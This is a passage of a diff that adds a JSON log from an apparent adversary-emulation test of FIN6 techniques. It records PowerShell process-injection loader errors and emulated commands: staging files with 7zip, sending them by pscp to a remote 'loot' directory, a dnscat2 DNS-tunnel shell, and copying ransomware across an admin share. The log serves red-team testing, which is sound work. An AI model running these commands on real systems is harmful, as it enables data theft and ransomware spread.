\"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:559 char:9\n+         $WriteProcessMemory = [System.Runtime.InteropServices.Marshal ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:564 char:9\n+         $ReadProcessMemory = [System.Runtime.InteropServices.Marshal] ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:569 char:9\n+         $CreateRemoteThread = [System.Runtime.InteropServices.Marshal ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:574 char:9\n+         $GetExitCodeThread = [System.Runtime.InteropServices.Marshal] ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:579 char:9\n+         $OpenThreadToken = [System.Runtime.InteropServices.Marshal]:: ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:584 char:9\n+         $GetCurrentThread = [System.Runtime.InteropServices.Marshal]: ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:589 char:9\n+         $AdjustTokenPrivileges = [System.Runtime.InteropServices.Mars ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:594 char:9\n+         $LookupPrivilegeValue = [System.Runtime.InteropServices.Marsh ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:599 char:9\n+         $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]:: ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:612 char:9\n+         $IsWow64Process = [System.Runtime.InteropServices.Marshal]::G ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:617 char:9\n+         $CreateThread = [System.Runtime.InteropServices.Marshal]::Get ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:622 char:3\n+         $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDel ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nYou cannot call a method on a null-valued expression.\nAt line:2273 char:5\n+ ...             $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr ...\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nVirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new \nPowerShell process will have a different memory layout, so the address the PE wants might be free).\nAt line:2285 char:4\n+             Throw \"VirtualAlloc failed to allocate memory for PE. If  ...\n+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : OperationStopped: (VirtualAlloc fa...might be free).:String) [], RuntimeException\n    + FullyQualifiedErrorId : VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new Po \n   werShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free).\n \n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Compress Files with 7zip (7.exe)",
+            "procedure-description": "Compress text files for exfiltration staging using 7zip, renamed to 7.exe",
+            "procedure-id": {
+                "type": "guid",
+                "id": "fd27fe6c-4846-4e94-aef9-f6bc21ab0f0e"
+            },
+            "mitre-technique-id": "T1560.001",
+            "order": 10,
+            "steps": [
+                {
+                    "command": "\"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\7za.exe\" a -mx3 ad.7z ad_*",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T07:44:21.000Z",
+                    "time-stop": "2024-10-01T07:44:21.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "'\\\"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\7za.exe\\\"' is not recognized as an internal or external command,\noperable program or batch file.\n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Exfiltration with PSCP",
+            "procedure-description": "Initiate an interactive SSH session with a remote server with pscp",
+            "procedure-id": {
+                "type": "guid",
+                "id": "6824cbb6-f3e1-4081-8a63-d72ae368cb23"
+            },
+            "mitre-technique-id": "T1567.002",
+            "order": 11,
+            "steps": [
+                {
+                    "command": "\"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\pscp.exe\" -P 22 \"C:\\Windows\\Temp\\ad_*\" \"root@192.0.2.20:/temp/loot\"",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T07:44:21.000Z",
+                    "time-stop": "2024-10-01T07:44:21.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "'\\\"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\pscp.exe\\\"' is not recognized as an internal or external command,\noperable program or batch file.\n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Exfiltrate Data via SSH",
+            "procedure-description": "Initiate an interactive SSH session with a remote server",
+            "procedure-id": {
+                "type": "guid",
+                "id": "78d94199-7e0e-442b-81a6-32f8e419a7ac"
+            },
+            "mitre-technique-id": "T1567.002",
+            "order": 12,
+            "steps": []
+        },
+        {
+            "procedure-name": "Registry Run Keys",
+            "procedure-description": "FIN6 utilizes cmd to execute Registry Run Keys",
+            "procedure-id": {
+                "type": "guid",
+                "id": "44d82f6f-f367-4db7-aa65-a9e5717b1a21"
+            },
+            "mitre-technique-id": "T1547.001",
+            "order": 15,
+            "steps": []
+        },
+        {
+            "procedure-name": "Scheduled Task Persistence",
+            "procedure-description": "FIN6 utilizes cmd to execute Scheduled Tasks",
+            "procedure-id": {
+                "type": "guid",
+                "id": "0864a91a-ae17-1cce-8b89-d4f8f2854699"
+            },
+            "mitre-technique-id": "T1053.005",
+            "order": 16,
+            "steps": []
+        },
+        {
+            "procedure-name": "dnscat2-powershell Exfiltration",
+            "procedure-description": "Powershell to execute POS data exfiltration over DNS tunnel via dnscat2",
+            "procedure-id": {
+                "type": "guid",
+                "id": "e74554b8-0bc9-3d50-95a4-e45421925b49"
+            },
+            "mitre-technique-id": "T1048.003",
+            "order": 17,
+            "steps": [
+                {
+                    "command": "import-module \"C:\\C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\dnscat2.ps1\"\nStart-Dnscat2 -Domain 127.0.0.1 -Exec cmd",
+                    "executor": "psh",
+                    "order": 1,
+                    "time-start": "2024-10-01T07:44:21.000Z",
+                    "time-stop": "2024-10-01T07:44:23.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "import-module : The specified module 'C:\\C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\dnscat2.ps1' was not loaded because no \nvalid module file was found in any module directory.\nAt line:1 char:1\n+ import-module \"C:\\C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99 ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : ResourceUnavailable: (C:\\C:\\Users\\tha...ads\\dnscat2.ps1:String) [Import-Module], FileNotFoundException\n    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand\n \nStart-Dnscat2 : The term 'Start-Dnscat2' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the \nspelling of the name, or if a path was included, verify that the path is correct and try again.\nAt line:2 char:1\n+ Start-Dnscat2 -Domain 127.0.0.1 -Exec cmd\n+ ~~~~~~~~~~~~~\n    + CategoryInfo          : ObjectNotFound: (Start-Dnscat2:String) [], CommandNotFoundException\n    + FullyQualifiedErrorId : CommandNotFoundException\n \n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "WMI Ransomware Distribution",
+            "procedure-description": "FIN6 utilizes WMI to distribute ransomware to intended targets",
+            "procedure-id": {
+                "type": "guid",
+                "id": "b393c022-329a-4c52-ab1f-eb594ee8d3cd"
+            },
+            "mitre-technique-id": "T1047",
+            "order": 18,
+            "steps": []
+        },
+        {
+            "procedure-name": "Copy Ransomware",
+            "procedure-description": "FIN6 utilizes cmd to copy ransomware to an internal distribution server",
+            "procedure-id": {
+                "type": "guid",
+                "id": "f50f8f39-2fb0-4fe3-9e2d-9af38aee447d"
+            },
+            "mitre-technique-id": "T1021.002",
+            "order": 19,
+            "steps": [
+                {
+                    "command": "start copy sss.exe \\\\127.0.0.1\\c$\\windows\\temp\\",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T07:44:23.000Z",
+                    "time-stop": "2024-10-01T07:48:06.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "Command execution timed out",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Copy Distribution Scripts",
+            "procedure-description": "FIN6 utilizes cmd to copy distribution scripts to an internal distribution server",
+            "procedure-id": {
+                "type": "guid",
+                "id": "e45dc48f-45f1-42d2-850c-4a15385c1646"
+            },
+            "mitre-technique-id": "T1021.002",
+            "order": 20,
+            "steps": [
+                {
+                    "command": "start copy xaa.bat \\\\127.0.0.1\\c$\\windows\\temp\\",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T07:52:09.000Z",
+                    "time-stop": "2024-10-01T07:52:32.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Copy Kill Scripts",
+            "procedure-description": "FIN6 utilizes cmd to copy kill scripts to an internal distribution server",
+            "procedure-id": {
+                "type": "guid",
+                "id": "6ffca252-9eb0-4ac0-93dd-35c9e7c6fae0"
+            },
+            "mitre-technique-id": "T1021.002",
+            "order": 21,
+            "steps": []
+        }
+    ]
+}
